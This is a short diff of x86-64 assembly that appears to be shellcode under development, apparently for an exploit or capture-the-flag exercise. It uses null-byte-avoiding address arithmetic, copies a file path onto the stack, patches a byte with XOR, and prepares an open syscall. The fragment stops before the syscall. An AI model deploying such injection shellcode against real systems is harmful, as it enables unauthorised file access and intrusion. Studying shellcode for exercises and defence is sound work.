@@ -9,14 +9,14 @@ _start:
 		lea		path+0x4444401(%rip), %rdi
 		sub		$0x4444401, %rdi
 
-		# movq 	(%rdi), %rax
-		# movq 	%rax, (%rsp)
+		movq 	(%rdi), %rax
+		movq 	%rax, (%rsp)
 
-		# movq 	0x8(%rdi), %rax
-		# movq 	%rax, 0x8(%rsp)
-		# movq 	%rsp, %rdi
+		movq 	0x3(%rdi), %rax
+		movq 	%rax, 0x3(%rsp)
+		movq 	%rsp, %rdi
 
-		xorb	$0x41, 0x55(%rsp)
+		# xorb	$0x41, (%rdi)
 		xor  	%rax, %rax
 		mov		$2, %al
 		xor    	%rsi,%rsi
